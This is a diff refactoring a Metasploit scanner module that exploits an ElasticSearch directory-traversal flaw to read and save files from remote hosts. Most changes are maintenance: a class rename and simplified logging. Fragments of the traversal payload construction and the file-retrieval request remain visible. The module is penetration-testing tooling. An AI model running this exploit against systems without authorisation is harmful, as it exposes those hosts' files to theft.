@@ -1,12 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'json'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
@@ -40,8 +39,6 @@ class Metasploit3 < Msf::Auxiliary
         OptInt.new('DEPTH', [true, 'Traversal depth', 7])
       ], self.class
     )
-
-    deregister_options('RHOST')
   end
 
   def check_host(ip)
@@ -72,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
     travs << payload.gsub('/', '%2f')
     travs << file.gsub('/', '%2f')
 
-    vprint_status("#{peer} - Retrieving file contents...")
+    vprint_status("Retrieving file contents...")
 
     res = send_request_raw(
       'method' => 'GET',
@@ -89,10 +86,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    vprint_status("#{peer} - Checking if it's a vulnerable ElasticSearch")
+    vprint_status("Checking if it's a vulnerable ElasticSearch")
 
     check_code = check_host(ip)
-    print_status("#{peer} - #{check_code.second}")
+    print_status("#{check_code.message}")
     if check_host(ip) != Exploit::CheckCode::Appears
       return
     end
@@ -102,14 +99,14 @@ class Metasploit3 < Msf::Auxiliary
 
     contents = read_file(filename)
     unless contents
-      print_error("#{peer} - No file downloaded")
+      print_error("No file downloaded")
       return
     end
 
     begin
       data_hash = JSON.parse(contents)
     rescue JSON::ParserError => e
-      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+      elog(e)
       return
     end
 
@@ -123,6 +120,6 @@ class Metasploit3 < Msf::Auxiliary
       fcontent,
       fname
     )
-    print_good("#{peer} - File saved in: #{path}")
+    print_good("File saved in: #{path}")
   end
 end
